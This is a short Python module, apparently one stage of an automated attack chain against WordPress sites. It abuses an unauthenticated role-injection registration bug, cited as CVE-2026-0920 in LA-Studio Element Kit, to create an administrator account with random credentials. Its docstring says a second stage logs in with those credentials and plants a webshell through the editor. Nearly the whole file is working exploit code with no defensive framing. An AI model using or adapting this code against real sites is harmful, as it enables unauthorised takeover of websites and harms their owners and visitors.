"""Track B, stage 1 — abuse an unauthenticated privilege-escalation bug to
mint an administrator account (e.g. CVE-2026-0920, LA-Studio Element Kit's
lakit_bkrole registration backdoor).

This does NOT get code execution by itself — it returns admin credentials.
Stage 2 (wp_authshell) logs in with them and plants a webshell via the editor.
Success is confirmed downstream by actually logging in, not by trusting the
exploit's HTTP response.
"""
import secrets


def _random_creds():
    user = "svc_" + secrets.token_hex(4)
    return {"username": user, "email": f"{user}@mail.invalid",
            "password": secrets.token_hex(12)}


def acquire_admin(base_url, http, recipe, creds=None):
    """Send the role-injection registration request. Returns the credentials
    it attempted to create ({'username','password'}), or None on transport
    error. Caller confirms real success by logging in with these creds."""
    creds = creds or _random_creds()
    data = {
        "action": recipe["action"],
        recipe.get("user_field", "user_login"): creds["username"],
        recipe.get("email_field", "email"): creds["email"],
        recipe.get("pass_field", "password"): creds["password"],
        recipe["role_param"]: recipe.get("role_value", "administrator"),
    }
    url = base_url.rstrip("/") + recipe["endpoint"]
    try:
        http.post(url, data=data)
    except Exception:
        return None
    return {"username": creds["username"], "password": creds["password"]}
